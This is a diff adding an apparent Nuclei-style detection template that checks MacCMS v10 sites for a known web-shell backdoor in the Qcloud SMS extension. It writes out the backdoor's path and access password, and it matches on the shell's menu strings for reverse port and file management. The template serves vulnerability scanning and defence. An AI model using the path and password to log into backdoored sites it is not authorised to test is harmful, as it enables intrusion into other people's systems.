@@ -1,0 +1,37 @@
+id: poc-local-cms-maccms-v10-sms-backdoor
+
+info:
+  name: poc-local-cms-maccms-v10-sms-backdoor
+  author: capiton
+  severity: critical
+  description: ""
+  reference:
+    - https://www.cnblogs.com/jinqi520/p/11596500.html
+    - https://www.t00ls.net/thread-53291-1-1.html
+  metadata:
+    fofa-query: ""
+    Vulnerability-Impact: maccms-V10
+  tags: maccms
+
+requests:
+  - method: POST
+    path:
+      - "{{RootURL}}/extend/Qcloud/Sms/Sms.php"
+    headers:
+        Content-Type: application/x-www-form-urlencoded
+    body: getpwd=WorldFilledWithLove
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      
+      - type: word
+        condition: and
+        part: body
+        words:
+          - "扫描后门"
+          - "反弹端口"
+          - "文件管理"
+
